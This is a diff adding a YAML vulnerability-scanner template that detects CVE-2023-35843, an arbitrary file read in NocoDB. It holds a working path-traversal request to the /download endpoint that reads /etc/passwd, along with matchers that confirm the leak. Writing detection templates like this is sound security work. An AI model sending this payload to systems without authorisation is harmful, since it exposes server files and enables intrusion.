@@ -1,0 +1,27 @@
+id: poc-yaml-nocodb-download-path-traversal
+info:
+  name: NocoDB Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-35843
+  description: |
+    This template detects an arbitrary file read vulnerability in NocoDB identified as CVE-2023-35843.
+http:
+  - method: GET
+    path:
+      - "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
